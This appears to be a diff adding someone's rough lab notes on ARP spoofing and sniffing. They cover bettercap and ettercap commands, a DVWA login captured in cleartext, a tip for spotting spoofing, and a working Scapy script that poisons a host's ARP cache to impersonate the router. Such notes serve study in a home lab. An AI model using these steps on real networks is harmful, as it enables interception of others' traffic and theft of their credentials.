@@ -1,0 +1,47 @@
+
+
+lets use bettercap
+
+    ┌──(root㉿kali)-[/home/kali]
+    └─# bettercap 
+    bettercap v2.32.0 (built for linux amd64 with go1.19.6) [type 'help' for a list of commands]
+
+    sudo su
+    buttercup -iface eth0 -caplet sniff.cap 
+
+
+
+lets use ettercap
+
+    allow packet forwaring> $ cat /proc/sys/net/ipv4/ip_forward -> 1
+
+    sudo su
+
+    ettercap -G
+
+    HTTP : 192.168.88.38:80 -> USER: admin  PASS: test  INFO: http://192.168.88.38/dvwa/login.php
+    CONTENT: username=admin&password=test&Login=Login
+
+
+check if you are beeing spoofed:
+    check arp tables -> if router has the same mac as some other ip -> probably spoofing
+
+
+scapy
+
+    broadcast = Ether(dst='ff:ff:ff:ff:ff:ff')
+    arp_layer = ARP(pdst='192.168.88.87')
+    entire_packet = broadcast/arp_layer
+    answer = srp(entire_packet, timeout=2, verbose=True)[0]
+
+    print(answer[0])
+    (<Ether  dst=ff:ff:ff:ff:ff:ff type=ARP |<ARP  pdst=192.168.88.87 |>>, <Ether  dst=08:00:27:c7:e1:36 src=2c:0d:a7:6f:e7:21 type=ARP |<ARP  hwtype=0x1 ptype=IPv4 hwlen=6 plen=4 op=is-at hwsrc=2c:0d:a7:6f:e7:21 psrc=192.168.88.87 hwdst=08:00:27:c7:e1:36 pdst=192.168.88.13 |<Padding  load='\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00' |>>>)
+    => MAC address = 2c:0d:a7:6f:e7:21
+
+    target_mac = '2c:0d:a7:6f:e7:21'
+    packet = ARP(op=2, hwdst=target_mac, pdst='192.168.88.87', psrc='192.168.88.1')
+    packet.show
+    <bound method Packet.show of <ARP  op=is-at psrc=192.168.88.1 hwdst=2c:0d:a7:6f:e7:21 pdst=192.168.88.87 |>>
+    send(packet, verbose=False)
+    -> host OS thinks kali is router ;)
+
